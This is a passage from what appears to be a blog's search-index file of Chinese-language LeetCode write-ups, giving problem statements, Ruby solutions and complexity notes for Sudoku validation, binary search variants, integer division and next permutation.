[&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;],</span><br><span class="line">  [&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]</span><br><span class="line">]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: Same as Example 1, except with the 5 in the top left corner being </span><br><span class="line">    modified to 8. Since there are two 8&apos;s in the top left 3x3 sub-box, it is invalid.</span><br></pre></td></tr></table></figure></p><p>Note:</p><ul><li>A Sudoku board (partially filled) could be valid but is not necessarily solvable.</li><li>Only the filled cells need to be validated according to the mentioned rules.</li><li>The given board contain only digits 1-9 and the character ‘.’.</li><li>The given board size is always 9x9.</li></ul><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>主要思路是用空间换时间，把每行、每列、每个9x9的格状态都保存，每遍历一个数字就判断一下这三个数组。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Character[][]&#125; board</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_valid_sudoku</span><span class="params">(board)</span></span></span><br><span class="line">  rows = Array.new(<span class="number">9</span>)&#123; Array.new(<span class="number">9</span>, <span class="literal">false</span>) &#125;</span><br><span class="line">  columns = Array.new(<span class="number">9</span>)&#123; Array.new(<span class="number">9</span>, <span class="literal">false</span>) &#125;</span><br><span class="line">  girds = Array.new(<span class="number">9</span>)&#123; Array.new(<span class="number">9</span>, <span class="literal">false</span>) &#125;</span><br><span class="line">  <span class="number">9</span>.times.each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    <span class="number">9</span>.times.each <span class="keyword">do</span> <span class="params">|j|</span></span><br><span class="line">      <span class="keyword">next</span> <span class="keyword">if</span> board[i][j] == <span class="string">"."</span></span><br><span class="line">      c = board[i][j].to_i - <span class="number">1</span></span><br><span class="line">      gird = <span class="number">3</span> * (i / <span class="number">3</span>) + j / <span class="number">3</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">if</span> (rows[i][c] <span class="keyword">or</span> columns[j][c] <span class="keyword">or</span> girds[gird][c])</span><br><span class="line">      rows[i][c] = <span class="literal">true</span></span><br><span class="line">      columns[j][c] = <span class="literal">true</span></span><br><span class="line">      girds[gird][c] = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(9x9)</code></li><li>空间复杂度：<code>O(3x9x9)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Search Insert Position</title>
      <link href="/2018/03/18/Search-Insert-Position/"/>
      <url>/2018/03/18/Search-Insert-Position/</url>
      <content type="html"><![CDATA[<h1 id="Search-Insert-Position"><a href="#Search-Insert-Position" class="headerlink" title="Search Insert Position"></a>Search Insert Position</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.</p><p>You may assume no duplicates in the array.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 5</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 2</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 7</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure></p><p>Example 4:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,5,6], 0</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>算法很简单，找到第一个比<code>target</code>小的就直接返回<code>index</code>。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_insert</span><span class="params">(nums, target)</span></span></span><br><span class="line">  nums.each_with_index <span class="keyword">do</span> <span class="params">|n, index|</span></span><br><span class="line">   <span class="keyword">return</span> index <span class="keyword">if</span> target &lt;= n</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> nums.length</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Find First and Last Position of Element in Sorted Array</title>
      <link href="/2018/03/17/Find-First-and-Last-Position-of-Element-in-Sorted-Array/"/>
      <url>/2018/03/17/Find-First-and-Last-Position-of-Element-in-Sorted-Array/</url>
      <content type="html"><![CDATA[<h1 id="Find-First-and-Last-Position-of-Element-in-Sorted-Array"><a href="#Find-First-and-Last-Position-of-Element-in-Sorted-Array" class="headerlink" title="Find First and Last Position of Element in Sorted Array"></a>Find First and Last Position of Element in Sorted Array</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given an array of integers nums sorted in ascending order, find the starting and ending position of a given target value.</p><p>Your algorithm’s runtime complexity must be in the order of O(log n).</p><p>If the target is not found in the array, return [-1, -1].</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [5,7,7,8,8,10], target = 8</span><br><span class="line">Output: [3,4]</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [5,7,7,8,8,10], target = 6</span><br><span class="line">Output: [-1,-1]</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>先找左边的起点，再找右边的终点，在找的时候都用二分查找。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_range</span><span class="params">(nums, target)</span></span></span><br><span class="line">  left = search_index(nums, target, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">if</span> left == nums.length <span class="keyword">or</span> nums[left] != target</span><br><span class="line">    <span class="keyword">return</span> [-<span class="number">1</span>, -<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  right = search_index(nums, target, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">return</span> [left, right - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_index</span><span class="params">(nums, target, left)</span></span></span><br><span class="line">  i, j = <span class="number">0</span>, nums.length</span><br><span class="line">  <span class="keyword">while</span> i &lt; j</span><br><span class="line">    m = (i + j) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> nums[m] &gt; target <span class="keyword">or</span> (left <span class="keyword">and</span> target == nums[m])</span><br><span class="line">      j = m</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      i = m + <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(logN)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Search in Rotated Sorted Array</title>
      <link href="/2018/03/16/Search-in-Rotated-Sorted-Array/"/>
      <url>/2018/03/16/Search-in-Rotated-Sorted-Array/</url>
      <content type="html"><![CDATA[<h1 id="Search-in-Rotated-Sorted-Array"><a href="#Search-in-Rotated-Sorted-Array" class="headerlink" title="Search in Rotated Sorted Array"></a>Search in Rotated Sorted Array</h1><h2 id="33-Search-in-Rotated-Sorted-Array"><a href="#33-Search-in-Rotated-Sorted-Array" class="headerlink" title="33. Search in Rotated Sorted Array"></a>33. Search in Rotated Sorted Array</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.<br>(i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]).<br>You are given a target value to search. If found in the array return its index, otherwise return -1.<br>You may assume no duplicate exists in the array.<br>Your algorithm’s runtime complexity must be in the order of O(log n).</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>数组被旋转后，中间值隔开的两个数组，一个是有序的，一个不是。我们先判断哪部分是有序的，然后判断目标值是否落在这部分，如果不在，说明在另一部分。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(nums, target)</span></span></span><br><span class="line">  i, j = <span class="number">0</span>, nums.length - <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt;= j</span><br><span class="line">    m = (i + j) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> m <span class="keyword">if</span> nums[m] == target</span><br><span class="line">    <span class="keyword">if</span> nums[m] &lt; nums[j]</span><br><span class="line">      <span class="keyword">if</span> nums[m] &lt;= target <span class="keyword">and</span> target &lt;= nums[j]</span><br><span class="line">        i = m + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        j = m - <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span> nums[i] &lt;= target <span class="keyword">and</span> target &lt;= nums[m]</span><br><span class="line">        j = m - <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        i = m + <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><ul><li>时间复杂度：<code>O(logn)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="81-Search-in-Rotated-Sorted-Array-II"><a href="#81-Search-in-Rotated-Sorted-Array-II" class="headerlink" title="81. Search in Rotated Sorted Array II"></a>81. Search in Rotated Sorted Array II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.<br>(i.e., [0,0,1,2,2,5,6] might become [2,5,6,0,0,1,2]).<br>You are given a target value to search. If found in the array return true, otherwise return false.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [2,5,6,0,0,1,2], target = 0</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [2,5,6,0,0,1,2], target = 3</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure></p><p>Follow up:</p><ul><li>This is a follow up problem to Search in Rotated Sorted Array, where nums may contain duplicates.</li><li>Would this affect the run-time complexity? How and why?</li></ul><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这题和<a href="https://leetcode.com/problems/search-in-rotated-sorted-array/description/" target="_blank" rel="noopener">Search in Rotated Sorted Array</a>的区别在于，数组里有重复数字，这会导致<code>[2 1 1]</code>和<code>[1 1 1 2 1]</code>两种情况出现，就是中间值和右值相同。对此处理只需将右值左移即可。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; target</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(nums, target)</span></span></span><br><span class="line">  i, j = <span class="number">0</span>, nums.length - <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt;= j</span><br><span class="line">    m = (i + j) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span> <span class="keyword">if</span> nums[m] == target</span><br><span class="line">    <span class="keyword">if</span> nums[m] &lt; nums[j]</span><br><span class="line">      <span class="keyword">if</span> nums[m] &lt;= target <span class="keyword">and</span> target &lt;= nums[j]</span><br><span class="line">        i = m + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        j = m - <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">elsif</span> nums[m] &gt; nums[j]</span><br><span class="line">      <span class="keyword">if</span> nums[i] &lt;= target <span class="keyword">and</span> target &lt;= nums[m]</span><br><span class="line">        j = m - <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        i = m + <span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N)</code>，右值左移这种情况会是复杂度提升。</li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Divide Two Integers</title>
      <link href="/2018/03/15/Divide-Two-Integers/"/>
      <url>/2018/03/15/Divide-Two-Integers/</url>
      <content type="html"><![CDATA[<h1 id="29-Divide-Two-Integers"><a href="#29-Divide-Two-Integers" class="headerlink" title="29. Divide Two Integers"></a>29. Divide Two Integers</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given two integers dividend and divisor, divide two integers without using multiplication, division and mod operator.</p><p>Return the quotient after dividing dividend by divisor.</p><p>The integer division should truncate toward zero.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: dividend = 10, divisor = 3</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: dividend = 7, divisor = -3</span><br><span class="line">Output: -2</span><br></pre></td></tr></table></figure></p><p>Note:</p><ul><li>Both dividend and divisor will be 32-bit signed integers.</li><li>The divisor will never be 0.</li><li>Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−2^31,  2^31 − 1]. For the purpose of this problem, assume that your function returns 231 − 1 when the division result overflows.</li></ul><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>用加减法实现除法，先举个例子，假设求<code>16 ÷ 3</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16 = 5 * 3 + 1 = （2^2 + 2^0) * 3 + 1</span><br></pre></td></tr></table></figure></p><p>我们用移位来实现2的幂次方。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; dividend</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; divisor</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide</span><span class="params">(dividend, divisor)</span></span></span><br><span class="line">  max_int = <span class="number">2147483647</span></span><br><span class="line">  flag = ((dividend &lt; <span class="number">0</span> <span class="keyword">and</span> divisor &gt;= <span class="number">0</span>) <span class="keyword">or</span> (dividend &gt;= <span class="number">0</span> <span class="keyword">and</span> divisor &lt; <span class="number">0</span>)) ? -<span class="number">1</span> : <span class="number">1</span></span><br><span class="line">  x, y = dividend.abs, divisor.abs</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> x &gt;= y</span><br><span class="line">    tmp, i = y, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &gt;= tmp</span><br><span class="line">      x -= tmp</span><br><span class="line">      result += i</span><br><span class="line">      i &lt;&lt;= <span class="number">1</span></span><br><span class="line">      tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  result = flag &gt;= <span class="number">0</span> ? result : -result </span><br><span class="line">  [max_int, result].min</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(logN)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Permutations</title>
      <link href="/2018/03/15/Permutations/"/>
      <url>/2018/03/15/Permutations/</url>
      <content type="html"><![CDATA[<h1 id="Permutations"><a href="#Permutations" class="headerlink" title="Permutations"></a>Permutations</h1><h2 id="31-Next-Permutation"><a href="#31-Next-Permutation" class="headerlink" title="31. Next Permutation"></a>31. Next Permutation</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.</p><p>If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).</p><p>The replacement must be in-place and use only constant extra memory.</p><p>Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.</p><p><code>1,2,3</code> → <code>1,3,2</code><br><code>3,2,1</code> → <code>1,2,3</code><br><code>1,1,5</code> → <code>1,5,1</code></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>用一个具体的例子来解释算法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1,2,3,5,4</span><br><span class="line"></span><br><span class="line"># 先确定i的位置</span><br><span class="line">1,2,3,5,4</span><br><span class="line">    i</span><br><span class="line"></span><br><span class="line"># 在确定j的位置</span><br><span class="line">1,2,3,5,4</span><br><span class="line">    i j</span><br><span class="line"></span><br><span class="line"># i,j互换</span><br><span class="line">1,2,5,3,4</span><br><span class="line">    i j</span><br><span class="line"></span><br><span class="line"># 逆转i+1至length-1</span><br><span class="line">1,2,5,4,3</span><br><span class="line">    i j</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Void&#125; Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_permutation</span><span class="params">(nums)</span></span></span><br><span class="line">  i = nums.length - <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> i &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[i + <span class="number">1</span>] &lt;= nums[i]</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> i &gt;= <span class="number">0</span></span><br><span class="line">    j = nums.length - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &gt;= <span class="number">0</span> <span class="keyword">and</span> nums[j] &lt;= nums[i]</span><br><span class="line">      j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    swap(nums, i, j)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  reverse(nums, i + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(nums, i, j)</span></span></span><br><span class="line">  tmp = nums[i]</span><br><span class="line">  nums[i] = nums[j]</span><br><span class="line">  nums[j] = tmp</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(nums, start)</span></span></span><br><span class="line">  i, j = start, nums.length - <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; j</span><br><span class="line">    swap(nums, i, j)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    j -= <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(N)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="46-Permutations"><a href="#46-Permutations" class="headerlink" title="46. Permutations"></a>46. Permutations</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a collection of distinct integers, return all possible permutations.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,3]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [1,3,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [2,3,1],</span><br><span class="line">  [3,1,2],</span><br><span class="line">  [3,2,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" 